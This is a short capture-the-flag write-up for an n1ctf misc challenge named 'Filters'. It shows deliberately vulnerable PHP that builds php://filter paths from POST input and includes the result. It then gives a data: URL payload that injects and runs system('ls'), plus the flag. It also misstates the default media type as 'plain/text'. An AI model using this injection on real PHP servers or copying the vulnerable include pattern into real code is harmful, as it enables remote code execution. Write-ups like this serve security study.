# Filters

a misc challenge with 10 solves at the end.

## Challenge

```
<?php

isset($_POST['filters'])?print_r("show me your filters!"): die(highlight_file(__FILE__));
$input = explode("/",$_POST['filters']);
$source_file = "/var/tmp/".sha1($_SERVER["REMOTE_ADDR"]);
$file_contents = [];
foreach($input as $filter){
    array_push($file_contents, file_get_contents("php://filter/".$filter."/resource=/usr/bin/php"));
}
shuffle($file_contents);
file_put_contents($source_file, $file_contents);
try {
    require_once $source_file;
}
catch(\Throwable $e){
    pass;
}

unlink($source_file);

?> 1
```

## Solution - Probably unintended

We solved this with simple trick, Accoring to rfc, the data url's format is:

```
data:[<mediatype>][;base64],<data>
```

The parts in `[]` are optional, and default media type is `plain/text`, So this payload
```
resource=data:,<?php%20system('ls');%20?>
```

would construct

```
php://filter/resource=data:,<?php%20system('ls');%20?>/resource=/usr/bin/php
```

which generates

```
<?php system('ls'); ?>/resource=/usr/bin/php
```

And the flag is <b>n1ctf{https_www_arknights_global}</b>

